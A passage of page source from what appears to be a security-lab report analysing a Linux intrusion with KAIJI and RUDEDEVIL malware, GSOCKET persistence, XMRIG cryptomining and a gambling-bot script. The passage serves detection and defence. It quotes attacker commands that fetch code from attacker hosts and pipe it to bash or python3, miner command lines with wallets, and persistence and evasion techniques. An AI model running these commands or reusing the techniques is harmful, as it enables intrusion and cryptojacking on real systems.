\",(0,n.jsx)(e.code,{children:\"StopCpu\"}),\" to \",(0,n.jsx)(e.code,{children:\"1\"}),\", halting all CPU tasks.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 0xA:\"}),\" Updates the CPU mining configuration with new data and retrieves the PID of the current process, allowing the malware to modify its cryptocurrency mining operations.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 0xB:\"}),\" Sets \",(0,n.jsx)(e.code,{children:\"stopxmr\"}),\" to \",(0,n.jsx)(e.code,{children:\"1\"}),\", effectively stopping the XMRIG miner.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Case 0xC:\"}),\" Resets \",(0,n.jsx)(e.code,{children:\"stopxmr\"}),\" to \",(0,n.jsx)(e.code,{children:\"0\"}),\" and retrieves the current process PID, resuming the mining activity.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image19.png\",alt:\"Processing of C2 commands\",title:\"Processing of C2 commands\",width:\"1304\",height:\"1520\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Each command gives the malware operators precise control over how the infected machine behaves, whether it\\u2019s participating in a DDoS attack, running new malware, or managing mining operations.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"variants-of-rudedevil-malware-and-xmrig-configuration\",children:\"Variants of RUDEDEVIL Malware and XMRIG Configuration\"}),`\n`,(0,n.jsx)(e.p,{children:\"While the file server mentioned before was active, we observed multiple versions of the RUDEDEVIL malware being uploaded. The core functionality of these versions remained largely the same, with the only significant variation being the embedded XMRIG commands used for cryptocurrency mining.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Each version of the malware was configured to connect to the same mining pool, \",(0,n.jsx)(e.code,{children:\"c3pool.org\"}),\", but with slight differences in the parameters passed to the XMRIG miner:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p R\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p 2\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p php\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"-o stratum+tcp://auto.c3pool[.]org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p 0\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Each of these commands directs the miner to connect to the same mining pool but specifies different wallets or configurations. By examining the \",(0,n.jsx)(e.code,{children:\"c3pool\"}),\" application, we confirmed that both XMR addresses associated with these commands are currently active and mining.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image9.png\",alt:\"C3pool mining revenue\",title:\"C3pool mining revenue\",width:\"1999\",height:\"1130\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Additionally, through this analysis, we were able to estimate the total profit generated by these two mining campaigns, highlighting the financial impact of the RUDEDEVIL malware and its connection to illegal cryptocurrency mining operations.\"}),`\n`,(0,n.jsx)(e.h2,{id:\"gsocket\",children:\"GSOCKET\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"To establish persistence, the threat actor downloaded and installed \",(0,n.jsx)(e.a,{href:\"https://github.com/hackerschoice/gsocket\",rel:\"nofollow\",children:\"GSOCKET\"}),\", a network utility designed to enable encrypted communication between machines that are behind firewalls or NAT. GSOCKET creates secure, persistent connections through the Global Socket Relay Network (GSRN). This open-source tool includes features like AES-256 encryption, support for end-to-end communication security, and compatibility with SSH, netcat, and TOR, which allow for encrypted file transfers, remote command execution, and even the creation of hidden services.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Although GSOCKET is not inherently malicious, its features can be leveraged for suspicious purposes.\"}),`\n`,(0,n.jsx)(e.p,{children:\"Once deployed, GSOCKET performs several actions to maintain persistence and conceal its presence. First, it checks the system for active kernel processes to decide which process it will masquerade as:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image7.png\",alt:\"GSOCKET Kernel Process Masquerading\",title:\"GSOCKET Kernel Process Masquerading\",width:\"1999\",height:\"315\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"It then creates the \",(0,n.jsx)(e.code,{children:\"/dev/shm/.gs-1000\"}),\" directory to download and store its binary in shared memory. Additionally, by default, it sets up an \",(0,n.jsx)(e.code,{children:\"/htop\"}),\" directory under \",(0,n.jsx)(e.code,{children:\"/home/user/.config/htop/\"}),\" to store both the GSOCKET binary and the secret key used for its operations.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Next, a cron job that runs the GSOCKET binary with the secret key every minute is set up.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image21.png\",alt:\"GSOCKET Crontab Persistence\",title:\"GSOCKET Crontab Persistence\",width:\"1901\",height:\"772\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The binary is executed under the name of a kernel process using the \",(0,n.jsx)(e.code,{children:\"exec -a [process_name]\"}),\" command, further enhancing the ability to evade detection. The cron job includes a base64 encoded command that, when decoded, ensures the persistence mechanism is regularly executed and disguised as a legitimate kernel process:\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"When decoding the payload, we see how the \",(0,n.jsx)(e.code,{children:\"defunct.dat\"}),\" secret key is used as an argument to execute the \",(0,n.jsx)(e.code,{children:\"defunct\"}),\" binary, which is masqueraded as \",(0,n.jsx)(e.code,{children:\"[raid5wq]\"}),\" through the use of \",(0,n.jsx)(e.code,{children:\"exec -a \"}),\"command:\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"In addition to using cron jobs, GSOCKET has the capability to establish persistence through shell profile modification, run control (\",(0,n.jsx)(e.code,{children:\"rc.local\"}),\") and Systemd. GSOCKET enumerates potential persistence locations:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image29.png\",alt:\"GSOCKET Persistence Technique Enumeration\",title:\"GSOCKET Persistence Technique Enumeration\",width:\"1428\",height:\"933\"})}),`\n`,(0,n.jsx)(e.p,{children:\"GSOCKET supports multiple webhooks, such as Telegram or Discord integrations, enabling remote control and notifications:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image14.png\",alt:\"GSOCKET Webhook Capabilities\",title:\"GSOCKET Webhook Capabilities\",width:\"1999\",height:\"823\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Finally, after installation, GSOCKET ensures that all files that are created or modified, will be timestomped to attempt to erase any trace of installation:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image16.png\",alt:\"GSOCKET Timestomping Capability\",title:\"GSOCKET Timestomping Capability\",width:\"806\",height:\"905\"})}),`\n`,(0,n.jsx)(e.p,{children:\"These features make GSOCKET an attractive tool for threat actors seeking stealth and persistence. In this campaign, GSOCKET was exploited to establish covert channels back to C2 servers while attempting to evade detection.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Additionally, a PHP payload was fetched from an external IP and saved as \",(0,n.jsx)(e.code,{children:\"404.php\"}),\", likely functioning as a backdoor for future access. We did not manage to obtain this payload.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"post-compromise-dwell-time\",children:\"Post compromise dwell time\"}),`\n`,(0,n.jsx)(e.p,{children:\"After a three-week period of quiet with no noticeable activity, the threat actors resumed operations by utilizing the built-in Python3 to establish a reverse connection to a new command-and-control server.\"}),`\n`,(0,n.jsx)(e.p,{children:\"After regaining access to the host, a newer version of the KAIJI malware was deployed.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"kaiji-malware-a-comparison-to-previous-samples\",children:\"KAIJI malware: a comparison to previous samples\"}),`\n`,(0,n.jsx)(e.p,{children:\"While investigating the files on the discovered file server, we saw a shell script. This shell script seems to be the main file used to download by an earlier stage, ensuring the correct architecture for the victim is used.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image2.png\",alt:\"KAIJI Download.sh Script\",title:\"KAIJI Download.sh Script\",width:\"1999\",height:\"925\"})}),`\n`,(0,n.jsx)(e.p,{children:\"The same Shell script is found in other reports where this script is used to deploy KAIJI.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"As part of our investigation, we analyzed the KAIJI malware samples found on the file server and compared them with samples identified by Black Lotus Labs in 2022. Their detailed analysis of \",(0,n.jsx)(e.code,{children:\"Chaos\"}),\" (KAIJI) can be found in their blog post\",(0,n.jsx)(e.a,{href:\"https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/\",rel:\"nofollow\",children:\" here\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Using \",(0,n.jsx)(e.a,{href:\"https://github.com/google/bindiff\",rel:\"nofollow\",children:\"BinDiff\"}),\", a binary comparison tool, we compared the functions in the binaries. The analysis revealed that the code in our sample was identical to the previously identified KAIJI sample from 2022.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image18.png\",alt:\"Bindiff for Old and New Version of KAIJI\",title:\"Bindiff for Old and New Version of KAIJI\",width:\"1999\",height:\"643\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Although the code was the same, one critical difference stood out: the C2 server address. Although the functionality remained consistent in both binaries, they pointed to different C2 domains.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Delving deeper into the disassembly, we identified a function named \",(0,n.jsx)(e.code,{children:\"main_Link\"}),\". This function is responsible for decoding the C2 server address used by the malware.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image31.png\",alt:\"KAIJI main_link Function\",title:\"KAIJI main_link Function\",width:\"1999\",height:\"988\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Once decoded, the function searches for the \",(0,n.jsx)(e.code,{children:\"|(odk)/*-\"}),\" postfix in the address and removes it, leaving only the C2 domain and port. This process ensures the malware can communicate with its C2 server, though the address it contacts may change between samples.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Given that some resources have been published that statically reverse engineer KAIJI, we will instead take a more detailed look at its behaviors.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image12.png\",alt:\"KAIJI Dynamic Analysis - Part 1\",title:\"KAIJI Dynamic Analysis - Part 1\",width:\"1999\",height:\"735\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After execution, KAIJI creates several files in the \",(0,n.jsx)(e.code,{children:\"/etc/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/dev/\"}),\" directories, \",(0,n.jsx)(e.code,{children:\"/etc/id.services.conf\"}),\", \",(0,n.jsx)(e.code,{children:\"/etc/32678\"}),\", \",(0,n.jsx)(e.code,{children:\"/dev/.img\"}),\" and \",(0,n.jsx)(e.code,{children:\"/dev/.old\"}),\". These scripts are places to establish persistence.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Two services are set up, \",(0,n.jsx)(e.code,{children:\"/etc/init.d/linux_kill\"}),\" and \",(0,n.jsx)(e.code,{children:\"crond.service\"}),\". \",(0,n.jsx)(e.code,{children:\"crond.service\"}),\" is executed by Systemd, while \",(0,n.jsx)(e.code,{children:\"linux_kill\"}),\" is used for SysVinit persistence.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"After reloading the Systemd daemon, the first network connection to the C2 is attempted.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image18.png\",alt:\"KAIJI Dynamic Analysis - Part 2\",title:\"KAIJI Dynamic Analysis - Part 2\",width:\"1999\",height:\"643\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Next, the \",(0,n.jsx)(e.code,{children:\"Systemd Late generator\"}),\" service file is created. More information on the workings of \",(0,n.jsx)(e.code,{children:\"Systemd\"}),\", and different ways of establishing persistence through this method can be found in our recent blog series dubbed \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"Linux Detection Engineering -  A primer on persistence mechanisms\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"KAIJI creates the \",(0,n.jsx)(e.code,{children:\"/boot/System.img.config\"}),\" file, which is an executable that is executed through the previously deployed \",(0,n.jsx)(e.code,{children:\"Systemd\"}),\" services. This binary, is amongst other binaries, another way of establishing persistence.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image26.png\",alt:\"KAIJI Dynamic Analysis - Part 3\",title:\"KAIJI Dynamic Analysis - Part 3\",width:\"1999\",height:\"481\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Next, KAIJI adjusts the \",(0,n.jsx)(e.code,{children:\"SELinux\"}),\" policies to allow unauthorized actions. It searches audit logs for denied operations related to \",(0,n.jsx)(e.code,{children:\"System.img.conf\"}),\", generates a new \",(0,n.jsx)(e.code,{children:\"SELinux\"}),\" policy to permit these actions, and installs the policy with elevated priority. By doing this, the malware bypasses security restrictions that would normally block its activity.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Additionally, it sets up multiple additional forms of persistence through bash profiles, and creates another two malicious artifacts; \",(0,n.jsx)(e.code,{children:\"/usr/lib/libd1rpcld.so\"}),\" and \",(0,n.jsx)(e.code,{children:\"/.img\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Right after, \",(0,n.jsx)(e.code,{children:\"/etc/crontab\"}),\" is altered through an echo command, ensuring that the \",(0,n.jsx)(e.code,{children:\"/.img\"}),\" file is executed by root on a set schedule.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image20.png\",alt:\"KAIJI Dynamic Analysis - Part 4\",title:\"KAIJI Dynamic Analysis - Part 4\",width:\"1999\",height:\"762\"})}),`\n`,(0,n.jsx)(e.p,{children:\"KAIJI continues to move several default system binaries to unusual locations, attempting to evade detection along the way.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image17.png\",alt:\"KAIJI Dynamic Analysis - Part 5\",title:\"KAIJI Dynamic Analysis - Part 5\",width:\"1999\",height:\"237\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"KAIJI uses the \",(0,n.jsx)(e.code,{children:\"renice\"}),\" command to grant PID \",(0,n.jsx)(e.code,{children:\"2957\"}),\", one of KAIJI's planted executables, the highest possible priority (on a scale of -20 to 19, lowest being the highest priority), ensuring it gets more CPU resources than other processes.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"To evade detection, KAIJI employed the bind mount technique, a defense evasion method that obscures malicious activities by manipulating how directories are mounted and viewed within the system.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, we see a trace of \",(0,n.jsx)(e.code,{children:\"cron\"}),\" executing the \",(0,n.jsx)(e.code,{children:\"/.img\"}),\", which was planted in the \",(0,n.jsx)(e.code,{children:\"/etc/crontab\"}),\" file earlier.\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"the-saga-continues\",children:\"The saga continues\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Two weeks later, the Apache backdoor became active again. Another backdoor was downloaded via the \",(0,n.jsx)(e.code,{children:\"www-data\"}),\" user through the Apache2 process using the command:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`sh -c wget http://91.92.241[.]103:8002/gk.php\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The contents of this payload remain unknown. At this stage, we observed attempts at manual privilege escalation, with the attackers deploying \",(0,n.jsx)(e.code,{children:\"pspy64\"}),\". \",(0,n.jsx)(e.code,{children:\"Pspy\"}),\" is a command-line tool for process snooping on Linux systems without requiring root permissions. It monitors running processes, including those initiated by other users, and captures events like cron job executions. This tool is particularly useful for analyzing system activity, spotting privilege escalation attempts, and auditing the commands and file system interactions triggered by processes in real time. It's commonly leveraged by attackers for reconnaissance in post-compromise scenarios, giving them visibility into system tasks and potential vulnerabilities\\u200B.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Notably, \",(0,n.jsx)(e.code,{children:\"pspy64\"}),\" was executed by the \",(0,n.jsx)(e.code,{children:\"[rcu_preempt]\"}),\" parent, indicating that the threat actors had transitioned from leveraging the web server backdoor to using the GSOCKET backdoor.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Further attempts at privilege escalation involved exploiting \",(0,n.jsx)(e.code,{children:\"CVE-2021-4034\"}),\", also known as \",(0,n.jsx)(e.code,{children:\"pwnkit\"}),\". This vulnerability affects the \",(0,n.jsx)(e.code,{children:\"pkexec\"}),\" component of the PolicyKit package in Linux systems, allowing an unprivileged user to execute arbitrary code with root privileges. By leveraging this flaw, an attacker can gain elevated access to the system, potentially leading to full control over the affected machine.\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"custom-built-binaries\",children:\"Custom built binaries\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Right after, the attackers attempted to download a custom-built malware named \",(0,n.jsx)(e.code,{children:\"apache2\"}),\" and \",(0,n.jsx)(e.code,{children:\"apache2v86\"}),\" from:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"http://62.72.22[.]91/apache2\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"http://62.72.22[.]91/apache2v86\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"We obtained copies of these files, which currently have zero detections on VirusTotal. However, when executing them dynamically, we observed segmentation faults, and our telemetry confirmed segfault activity on the compromised host. Over a week, the threat actor attempted to alter, upload and execute these binaries more than 15 times, but due to repeated segfaults, it is unlikely that they succeeded in running this custom malware.\"}),`\n`,(0,n.jsx)(e.p,{children:\"While the binaries failed to execute, they still provided valuable insights during reverse engineering. We uncovered several XOR-encoded strings within the samples.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image33.png\",alt:\"Apache2 XOR-Encoded Strings\",title:\"Apache2 XOR-Encoded Strings\",width:\"1999\",height:\"1130\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The XOR key used to encode the strings was identified as \",(0,n.jsx)(e.code,{children:\"0x79\"}),\" (or the character \",(0,n.jsx)(e.code,{children:\"y\"}),\"). After decoding the strings, we discovered fragments of an HTTP request header that the malware was attempting to construct:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`/934d9091-c90f-4edf-8b18-d44721ba2cdc HTTP/1.1\nsec-ch-ua: \"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\nsec-ch-ua-platform: \"Windows\"\nupgrade-insecure-requests: 1\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nreferer: https://twitter[.]com\naccept-language: ru,en-US;q=0.9\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"This indicates that the malware was in the process of constructing HTTP requests. However, based on the incomplete nature of the headers and the repeated failures in execution, it\\u2019s clear that this piece of software was not yet fully developed or operational.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"additional-reconnaissance\",children:\"Additional reconnaissance\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The attackers continued to use tools from The Hacker\\u2019s Choice, by downloading and executing \",(0,n.jsx)(e.a,{href:\"https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh\",rel:\"nofollow\",children:(0,n.jsx)(e.code,{children:\"whatserver.sh\"})}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"This Shell script is designed to gather and display server information. It extracts details such as the fully qualified domain names (FQDNs) from SSL certificates, Nginx, and Apache configuration files, along with system resource information like CPU and memory usage, virtualization details, and network settings. The script can also summarize recent activities, including last logged-in users and currently listening services.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"mining-activities\",children:\"Mining activities\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"After nearly two weeks of manual exploitation attempts, the threat actors ceased their efforts to escalate privileges, likely having failed to gain root access. Instead, they established persistence as the \",(0,n.jsx)(e.code,{children:\"www-data\"}),\" user, leveraging GSOCKET to set up an SSL connection, which was disguised as a kernel process called \",(0,n.jsx)(e.code,{children:\"[mm_percpu_wq]\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"After decoding the base64 contents, we get a very familiar looking output:\"}),`\n`,(0,n.jsx)(e.p,{children:\"Through our behavioral rules, we see the threat actor listing the current user\\u2019s crontab entries, and echoing a payload directly into the crontab.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This command tries to download \",(0,n.jsx)(e.code,{children:\"http://gcp.pagaelrescate[.]com:8080/ifindyou\"}),\" every minute, and pipe it to bash. Looking at the contents of \",(0,n.jsx)(e.code,{children:\"ifindyou\"}),\", we see the following Bash script:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image8.png\",alt:\"Stage 1 - ifindyou.sh\",title:\"Stage 1 - ifindyou.sh\",width:\"1697\",height:\"1563\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This script gathers hostname and IP information, downloads the \",(0,n.jsx)(e.code,{children:\"SystemdXC\"}),\" archive from \",(0,n.jsx)(e.code,{children:\"http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC\"}),\" (XMRIG), stores this in \",(0,n.jsx)(e.code,{children:\"/tmp/SystemdXC\"}),\", extracts the archive and executes it with the necessary parameters to start mining Bitcoin.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"When examining the mining command, we can see how the malware configures XMRIG:\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This command connects to the \",(0,n.jsx)(e.code,{children:\"unmineable.com\"}),\" mining pool, using the infected machine\\u2019s hostname as an identifier in the mining process. At the time of writing, there are 15 active workers mining Bitcoin for the wallet address \",(0,n.jsx)(e.code,{children:\"1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image1.png\",alt:\"Bitcoin Address Lookup\",title:\"Bitcoin Address Lookup\",width:\"1984\",height:\"1999\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Upon further investigation into the Bitcoin address, we found that this address has performed a single transaction.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image32.png\",alt:\"Bitcoin Transaction\",title:\"Bitcoin Transaction\",width:\"1788\",height:\"1999\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Interestingly, the output address for this transaction points to a well-known \",(0,n.jsx)(e.a,{href:\"https://www.ledger.com/academy/topics/security/hot-wallet-vs-cold-crypto-wallet-whats-the-difference\",rel:\"nofollow\",children:\"hot wallet\"}),\" associated with Binance, indicating that the attackers may have transferred their mining earnings to an exchange platform.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image10.png\",alt:\"Binance Wallet Destination\",title:\"Binance Wallet Destination\",width:\"1984\",height:\"456\"})}),`\n`,(0,n.jsx)(e.p,{children:\"When returning our focus back to the script, we also see two commands commented out, which will become more clear later. The script executes:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`curl -s http://gcp.pagaelrescate[.]com:8080/cycnet | bash\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Looking at this payload, we can see the following contents:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image23.png\",alt:\"Stage 2 - cycnet.sh\",title:\"Stage 2 - cycnet.sh\",width:\"1636\",height:\"606\"})}),`\n`,(0,n.jsx)(e.p,{children:\"This stage checks the output of the command, and sends this to a Telegram chat bot. Through our Telegram behavioral rule, we can see that a Telegram POST request looks like this:\"}),`\n`,(0,n.jsx)(e.p,{children:\"The cron job that is set up during this stage executes at minute 0, every 4th hour. This job executes:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{children:`curl -s http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot | python3\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"The downloaded Python script automates interactions with an online gambling game through HTTP requests. The script includes functions that handle user authentication, betting, processing the outcomes, and sending data to a remote server.\"}),`\n`,(0,n.jsx)(e.p,{children:\"Upon closer examination, we identified the following key components of the script:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.strong,{children:\"Global Variables:\"})}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"usuario\"}),\": Stores the user ID for managing the session.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"apuesta\"}),\": Represents the bet amount.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"ganancias\"}),\": Tracks the winnings and losses.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"saldo_actual\"}),\": Holds the current account balance.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image3.png\",alt:\"enviador_slot Global Variables\",title:\"enviador_slot Global Variables\",width:\"636\",height:\"304\"})}),`\n`,(0,n.jsxs)(e.h4,{id:\"understanding-the-obteneruid-function\",children:[\"Understanding the \",(0,n.jsx)(e.code,{children:\"obteneruid\"}),\" Function\"]}),`\n`,(0,n.jsx)(e.p,{children:\"This function authenticates the user by sending a POST request with the necessary headers and JSON data to the remote server. If the user is not already set, it initializes a new session and retrieves the account balance. Upon successful authentication, it returns a session UUID, which is used for further interactions in the game.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image27.png\",alt:\"enviador_slot obteneruid Function\",title:\"enviador_slot obteneruid Function\",width:\"1686\",height:\"1503\"})}),`\n`,(0,n.jsxs)(e.h4,{id:\"understanding-the-enviardatos-function\",children:[\"Understanding the \",(0,n.jsx)(e.code,{children:\"enviardatos\"}),\" Function\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"This function sends game data or status updates back to \",(0,n.jsx)(e.code,{children:\"gcp.pagaelrescate[.]com\"}),\", logging the results or actions taken during gameplay. It uses a simple GET request to transmit this data to the remote server.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image4.png\",alt:\"enviador_slot enviardatos Function\",title:\"enviador_slot enviardatos Function\",width:\"1131\",height:\"217\"})}),`\n`,(0,n.jsxs)(e.h4,{id:\"understanding-the-hacerjugada-function\",children:[\"Understanding the \",(0,n.jsx)(e.code,{children:\"hacerjugada\"}),\" Function\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The \",(0,n.jsx)(e.code,{children:\"hacerjugada\"}),\" function simulates the betting process for a set number of rounds. It sends POST requests to place bets, updates the winnings or losses after each round, and calculates the overall results. If a bonus round is triggered, it calls \",(0,n.jsx)(e.code,{children:\"completarbono()\"}),\" to handle any bonus game details. Between each betting round, the function enforces a 30-second delay to mimic natural gameplay and avoid detection.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image28.png\",alt:\"enviador_slot hacerjugada Function\",title:\"enviador_slot hacerjugada Function\",width:\"1694\",height:\"1899\"})}),`\n`,(0,n.jsxs)(e.h4,{id:\"understanding-the-completarbono-function\",children:[\"Understanding the \",(0,n.jsx)(e.code,{children:\"completarbono\"}),\" Function\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"When a bonus round is triggered, this function completes the round by sending a request containing the session ID and round ID. Based on the result, it updates the account balance and logs the winnings or losses. Any change in the balance is sent back to the remote server using the \",(0,n.jsx)(e.code,{children:\"enviardatos()\"}),\" function.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/betting-on-bots/image6.png\",alt:\"enviador_slot completarbono 